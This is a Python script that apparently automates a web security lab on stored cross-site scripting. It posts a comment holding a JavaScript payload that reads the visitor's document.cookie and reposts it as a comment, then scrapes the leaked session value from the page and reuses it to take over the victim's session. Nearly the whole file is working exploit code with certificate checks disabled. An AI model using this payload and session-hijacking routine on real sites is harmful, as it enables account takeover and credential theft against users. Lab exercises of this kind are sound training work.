import argparse
from bs4 import BeautifulSoup
import requests
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, post_url, proxies=None):
    try:
        print(f"Getting CSRF token from: {post_url}")
        response = session.get(post_url, proxies=proxies, verify=False, timeout=30)
        
        if response.status_code != 200:
            print("Failed to get post page")
            return None
            
        bs = BeautifulSoup(response.text, 'html.parser')
        csrf_token = None
        
        csrf_input = bs.find('input', {'name': 'csrf'})
        if (csrf_input and csrf_input.get('value')):
            csrf_token = csrf_input['value']
    
        if csrf_token:
            print(f"Found CSRF token: {csrf_token}")
            return csrf_token
            
        print("CSRF token not found in the page")
        return None
            
    except requests.exceptions.RequestException as e:
        print(f"Error getting CSRF token: {e}")
        return None


def xss_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',        
            'https': '127.0.0.1:8080'
        } if use_proxy else None
        
        blog_url = urljoin(url, 'post?postId=1')
        comment_url = urljoin(url, 'post/comment')
        
        session = requests.Session()
        csrf_token = get_csrf_token(session, blog_url, proxies)
        if not csrf_token:
            print("Failed to get CSRF token")
            return False, None
            
        create_comment(url, proxies, csrf_token, session, comment_url)
        session_data = extract_session_cookie(blog_url, proxies, session)   
        
        cookies = {'session': session_data}
        requests.get(url, cookies=cookies, proxies=proxies, verify=False, timeout=30)
        
        return is_solved(url, proxies)

    except requests.exceptions.RequestException as e:
        print(f"Error during XSS test: {e}")
        return False, None

def create_comment(url, proxies, csrf_token, session, post_url):    
    print("Creating comment with XSS payload")
    
    base_url = url.rstrip('/')
    comment_endpoint = f"{base_url}/post/comment"
    
    comment = f'''
    <script>
        window.onload = function() {{
            let csrf_token = document.getElementsByName("csrf")[0].getAttribute("value");

            if (!csrf_token) {{
                console.error("CSRF token not found!");
                return;
            }}

            let data = new FormData();
            data.append("postId", "1");
            data.append("csrf", csrf_token);
            data.append("comment", document.cookie);
            data.append("name", "kurabiye");
            data.append("email", "asd@asd.com");
            data.append("website", "https://www.google.com");
            
            fetch("{comment_endpoint}", {{
                method: "POST",
                mode: "no-cors",
                body: data
            }});
        }}
    </script>'''

    payload = {
        "postId": "1",
        "csrf": csrf_token,
        "comment": comment,
        "name": "kurabiye",
        "email": "kurabiye@gmail.com",
        "website": "https://www.google.com"
    } 
    
    print(f"Sending XSS payload: {payload}")
    print(f"Posting comment to: {post_url}")
    response = session.post(post_url, data=payload, proxies=proxies, verify=False, timeout=30)
    
    if response.status_code == 200 and "thank you for your comment!" in response.text.lower():
        print("The comment sent successfully")
    else:
        print(f"The comment could not sent, status code: {response.status_code}")
        return False, response

def extract_session_cookie(blog_url, proxies, session):
    response = session.get(blog_url, proxies=proxies, verify=False, timeout=30)
    if response.status_code != 200:
        print("Failed to get post page")
        return None
        
    print("Extracting session data from the page")
    soup = BeautifulSoup(response.text, 'html.parser')
    
    p_tags = soup.find_all('p')
    for p_tag in p_tags:
        if 'secret' in p_tag.text.lower():
            try:
                session_data = p_tag.text.split('session=')[1].split(';')[0].strip()
                print(f"Session Value: {session_data}")
                return session_data 
            except IndexError:
                print("Session information could not be extracted.")
    
    print("No session data found in the page")
    return None

def is_solved(url, proxies):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        if response.status_code != 200:
            return False, response
        return "congratulations" in response.text.lower(), response
    except:
        return False, None

def main():
    parser = argparse.ArgumentParser(description='XSS Test for Lab 22')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'
    
    print("Starting XSS Test...")
    print(f"Target URL: {args.url}")
    
    success, response = xss_test(args.url, args.proxy)
    if success:
        print("XSS Lab completed successfully!")
    else:
        print("XSS Lab failed.")
        if response:
            print(f"HTTP Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")

if __name__ == "__main__":
    main()
